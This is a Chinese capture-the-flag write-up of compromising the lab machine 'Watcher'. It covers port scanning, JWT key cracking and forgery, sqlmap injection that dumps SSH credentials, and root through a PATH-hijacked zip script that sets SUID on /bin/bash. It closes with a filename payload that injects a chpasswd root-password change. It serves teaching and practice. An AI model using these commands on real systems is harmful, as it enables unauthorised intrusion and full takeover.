# 信息收集与端口探测

打靶第一步老规矩，先找出目标机器的 IP 地址。这里我用 arp-scan 扫了一下当前 VMware 的网段。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l       
[sudo] password for kali:                                          
Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:e0:22:04       VMware, Inc.
192.168.205.197 08:00:27:1d:84:c7       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:ef:3c:30       VMware, Inc.
```

确认靶机 IP 为 192.168.205.197，接着对目标进行全端口扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.197
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-02 09:07 -0400
Nmap scan report for 192.168.205.197
Host is up (0.00032s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
MAC Address: 08:00:27:1D:84:C7 (Oracle VirtualBox virtual NIC)
```

目标只开了 22 的 SSH 和 5000 端口，重点关注 5000 端口上的 Web 服务。

# Web 渗透：JWT 伪造到后台注入

访问 5000 端口发现是一个登录窗口，我习惯性地试了几组弱口令，没成功，于是自己注册了一个普通用户进去。跳转到仪表盘后，提示当前等级为 Normal，且系统管理页限制只有 admin 才能进。

这里抓个包看了一下请求头。

```http
GET /dashboard HTTP/1.1
Host: 192.168.205.197:5000
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImxsMTA0NTY3IiwibGV2ZWwiOiJub3JtYWwiLCJpYXQiOjE3ODA0MDU3MjIsImV4cCI6MTc4MDQwOTMyMn0.wp2jI4M_tscZVSjq45nfhUjRwmCNcxdKcXuo0I3hoAM
```

Cookie 里带有明显的 JWT 凭证，解码后看到 payload 里有用户名和权限等级信息。既然有 JWT，尝试爆破一下它的签名密钥。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImxsMTA0NTY3IiwibGV2ZWwiOiJub3JtYWwiLCJpYXQiOjE3ODA0MDU3MjIsImV4cCI6MTc4MDQwOTMyMn0.wp2jI4M_tscZVSjq45nfhUjRwmCNcxdKcXuo0I3hoAM" > hash
                                                                                                                                                                                
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 512/512 AVX512BW 16x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
maze             (?)   
1g 0:00:00:00 DONE (2026-06-02 09:10) 2.040g/s 11635Kp/s 11635Kc/s 11635KC/s me2uebars..maycee09
```

字典跑到一半就出结果了，密钥是 `maze`。接下来直接去 jwt.io 或者其它工具网站，把 data 里的 username 和 level 全改成 admin，用拿到的密钥重新生成签名的 Token。替换掉原本的 Cookie 后，我成功进入了系统管理界面。

## API 接口 SQL 注入

进到后台后，页面看起来没什么敏感配置，但我翻看前端源码发现，点击设置按钮会向 `/api/settings/update` 接口发送一段 JSON 数据。我直接用 curl 构造了一个带单引号的 payload 过去测试。

```bash
curl -s -X POST $U -H "Content-Type: application/json" -b "token=$TOKEN" -d "{\"key\":\"theme'\",\"value\":\"dark\"}"
{"code":500,"msg":"\u6570\u636e\u5e93\u9519\u8bef: unrecognized token: \"'theme''\""}
```

回显报错了，而且暴露了后端用的是 SQLite 数据库。有明显注入点，懒得手工注了，直接把包丢给 sqlmap。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sqlmap -u "http://192.168.205.197:5000/api/settings/update" --method POST --headers="Content-Type: application/json" --cookie="token=$TOKEN" --data='{"key":"theme*","value":"dark"}' --dbms=sqlite --batch --tables --threads=10 --no-cast

+-----------------+
| secret          |
| settings        |
| sqlite_sequence |
| users           |
+-----------------+
```

跑出四张表，`secret` 表看着最有货，继续 dump 里面的数据。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sqlmap -u "http://192.168.205.197:5000/api/settings/update" --method POST --headers="Content-Type: application/json" --cookie="token=$TOKEN" --data='{"key":"theme*","value":"dark"}' --dbms=sqlite --batch --tables --threads=10 --no-cast -T secret --dump

[1 entry]
+----+----------------------------------+
| id | secret                           |
+----+----------------------------------+
| 1  | watcher:mazesec123q1231w!@#!@@#$ |
+----+----------------------------------+
```

成功拿到一组明文账号密码。

# 初始立足点

拿到凭证后，回想之前探测到的 22 端口，直接用这个账号密码通过 SSH 连上去。

```bash
watcher@Watcher:~$ id
uid=1000(watcher) gid=1000(watcher) groups=1000(watcher),100(users)
```

登录成功，拿到普通用户权限。

# 本地提权：监控进程与路径劫持

在靶机里翻找了一段时间，发现当前目录下有个 `uploads` 目录，不知道干嘛用的。另外 `/opt/` 下面有个叫 `autoarchive` 的文件夹，但是当前用户没权限进去看。

这种场景通常有定时任务或者后台监控进程在跑。我从本地起个 HTTP 服务，传了一个进程监控工具进去。这里我没有用常规的 pspy，而是用了 kozmer 大佬二开的 rspy，因为 pspy 有时候对瞬间执行的进程不够敏感。

```bash
watcher@Watcher:~$ cd /tmp/
watcher@Watcher:/tmp$ cd /tmp;busybox wget 192.168.205.128/rspy;chmod +x /tmp/rspy
watcher@Watcher:/tmp$ ./rspy --dbus --dbus-interval 1
```

刚跑起来，终端就弹出了几条历史记录。

```bash
2026-06-02 09:29:57 CMD : UID=0     PID=394      | inotifywait -m -e create /home/watcher/uploads
2026-06-02 09:29:57 CMD : UID=0     PID=395      | /bin/bash /opt/autoarchive/sync.sh
```

这说明后台有个 root 权限的 `inotifywait` 在死盯着 `/home/watcher/uploads` 目录的 create 事件，一旦触发就会执行 `sync.sh`。

## 摸索触发条件与抓包盲区

我尝试在 uploads 里随便建个文件。

```bash
watcher@Watcher:~/uploads$ touch 1
```

没有任何反应。后面经过反复测试，发现文件名必须带 `.txt` 后缀才能触发。

```bash
watcher@Watcher:~/uploads$ echo '123123' > a.txt
```

```bash
2026-06-02 09:36:43 DBUS: UID=0     PID=700      | "[sync.sh]"
2026-06-02 09:36:43 CMD : UID=0     PID=700      | sleep 3
2026-06-02 09:36:46 DBUS: UID=0     PID=701      | /bin/bash /opt/autoarchive/archive-helper a.txt
2026-06-02 09:36:46 DBUS: UID=0     PID=702      | /bin/bash /opt/autoarchive/archive-helper a.txt
```

触发是触发了，但进程监控里只看到了它调用 `archive-helper`，由于底层其实执行的是 zip 压缩，速度太快，连 rspy 抓 proc 目录都漏掉了具体执行了什么系统命令。

为了看清它底层到底敲了什么命令，得想办法让这个进程“慢下来”或者卡住。我想到几个路子：
一是死磕运气，多建几个文件让 rspy 瞎猫碰死耗子抓一次。
二是塞个极大的文件进去，强行拖慢 zip 的压缩时间。

```bash
watcher@Watcher:~/uploads$ dd if=/dev/zero of=big.txt bs=1M count=512
512+0 records in
512+0 records out
536870912 bytes (537 MB, 512 MiB) copied, 1.1236 s, 478 MB/s
```

这招运气好确实能看清命令，但后来我用到一个 111 大佬教的奇招：直接在文件名里带上横杠 `-`。

![a](https://7r1umphk.github.io/image/20260604180255763.webp)

```bash
watcher@Watcher:~/uploads$ printf '' > "./- a.txt"
```

这个文件一建出来，进程就直接卡死了。

```bash
2026-06-02 09:43:05 DBUS: UID=0     PID=745      | /bin/bash /opt/autoarchive/archive-helper "- a.txt"
2026-06-02 09:43:05 DBUS: UID=0     PID=746      | /bin/bash /opt/autoarchive/archive-helper "- a.txt"
2026-06-02 09:43:05 CMD : UID=0     PID=745      | /bin/bash /opt/autoarchive/archive-helper - a.txt
2026-06-02 09:43:05 CMD : UID=0     PID=746      | zip -q /root/backups/latest.zip - a.txt
```

连敲 `ps aux` 都能看得一清二楚。

```bash
root         745  0.0  0.1   7084  3388 ?        S    09:43   0:00 /bin/bash /opt/autoarchive/archive-helper - a.txt
root         746  0.0  0.1   6176  2484 ?        S    09:43   0:00 zip -q /root/backups/latest.zip - a.txt
```

原来后台执行的是 `zip` 命令，文件名带 `-` 时，zip 会把它误认为参数去等待标准输入，导致进程被一直挂起。

## 环境变量劫持提权

最关键的信息来了：脚本调用 `zip -q /root/backups/latest.zip` 时，**没有写绝对路径**。且程序的工作目录明显就在我可控的 `uploads` 目录下。这就好办了，直接在当前目录写一个恶意的 `zip` 同名脚本进行劫持。

由于刚才用横杠大法把进程卡死了，为了继续利用，我把靶机重启了一下。重新连上后，开始构造 payload。

```bash
watcher@Watcher:~/uploads$ echo 'chmod +s /bin/bash' > zip
watcher@Watcher:~/uploads$ chmod +x zip 
```

在 `uploads` 目录下伪造了一个 zip 执行文件，作用是给 bash 赋 SUID 权限。接着随便建个 `.txt` 文件去触发监控。

```bash
watcher@Watcher:~/uploads$ touch 1.txt
watcher@Watcher:~/uploads$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1298416 Mar  8 11:21 /bin/bash
```

触发成功，查看 `/bin/bash` 发现 SUID 位已经亮了。

```bash
watcher@Watcher:~/uploads$ /bin/bash -p
bash-5.2# id
uid=1000(watcher) gid=1000(watcher) euid=0(root) egid=0(root) groups=0(root),100(users),1000(watcher)
bash-5.2# cat /root/root.txt /home/watcher/user.txt 
flag{root-6661e4dc99e9408984d16d30b0c0730c}
flag{user-c3949567202847f1ad8664095f0a94e4}
```

直接拿 shell，成功获取 root 权限并读到两个 flag。

---

碎碎念：先叠甲，没有攻击/隐射任何人或组织的想法。

这个提权点其实应该走的是 zip 的命令注入，也就是通过构造特殊文件名来注入参数：

```bash
touch -- '-T -TT echo${IFS}root:1|chpasswd;#.txt'
su root
```

至于为什么我明知道有这条路，文章里还是写的 PATH 劫持。因为我一开始打的时候走的就是 PATH，你可以说我狗运或者说我马后炮，但我是这么做的我就这么写了。我知道这个方法在理论上缺乏严谨的支撑，但它确实打通了，我也不想深究（没人提的话）。

这也侧面说明了一个问题：这个博客里面很多 writeup 都是有问题的，就我个人来看也不是完美的，但我还是这样发了。你说我坏吧，也不绝对，主要是懒。所以如果你发现哪篇文章有问题，直接评论区喷我就行，或者你认识我的话直接私聊我也行（想给我留点脸）。不用怕我丢脸，我没脸。你不说我不改（笑）。

这次就是某不愿透露姓名的大佬在文章发出来两三天后就发现了这个问题并且跟我提了，感谢。